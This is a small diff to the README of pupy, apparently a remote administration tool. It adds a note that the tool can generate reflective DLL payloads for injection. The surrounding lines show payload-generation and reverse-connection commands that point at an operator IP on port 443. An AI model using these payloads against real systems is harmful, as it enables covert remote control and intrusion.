@@ -37,6 +37,7 @@ The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac 
 ```bash
 ./genpayload.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
 ```
+you can also use -t dll_x86 or dll_x64 to generate a reflective DLL and inject/load it by your own means.
 #### for Linux
 ```bash
 pip install rpyc #(or manually copy it if you are not admin)
@@ -74,7 +75,7 @@ python reverse_ssl.py 192.168.0.1:443
 #####interactive python shell
 ![screenshot8](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/pyshell.png "screenshot8")
 
-##write a module : example a MsgBox
+##example: How to write a MsgBox module
 first of all write the function/class you want to import on the remote client  
 in the example we create the file pupy/packages/windows/all/pupwinutils/msgbox.py 
 ```python
